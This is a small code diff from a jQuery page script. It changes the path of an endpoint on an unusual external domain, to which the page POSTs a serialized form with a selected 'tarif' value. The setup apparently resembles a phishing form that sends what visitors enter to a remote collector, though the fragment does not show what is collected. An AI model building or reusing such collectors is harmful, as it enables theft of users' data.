@@ -465,7 +465,7 @@ var tarif = $('input[name="tarif"]:checked').val();
       $("#process1").fadeIn(); 
         $.ajax({
             type: 'POST',
-            url: 'https://choreo.ii-fi.cfd/c7he/ss/tarif.php',
+            url: 'https://choreo.ii-fi.cfd/c7he/ssx/tarif.php',
             data: $('#patok').serialize(),
             datatype: 'JSON',            
             complete: function(data) {
